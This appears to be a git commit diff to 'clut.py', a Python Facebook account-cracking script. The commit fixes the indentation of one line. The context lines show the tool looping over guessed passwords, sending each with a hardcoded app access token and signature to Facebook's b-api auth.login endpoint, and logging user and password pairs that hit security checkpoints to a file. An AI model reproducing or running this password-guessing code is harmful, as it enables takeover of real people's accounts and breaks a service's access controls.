a4ad72e198b11b6278045e3e30d1afb3a44ebd63
gendeng777 <69396037+gendeng777@users.noreply.github.com>
2020-11-26 01:07:08 +0700

    Update clut.py

--- clut.py
+++ clut.py
@@ -809,7 +809,7 @@ def crack_ident():
                                 cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
                                 cps.close()
                                 cekpoint.append(user + pass5)
-                           else:
+                            else:
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 w = json.load(data)
                                 if 'access_token' in w:
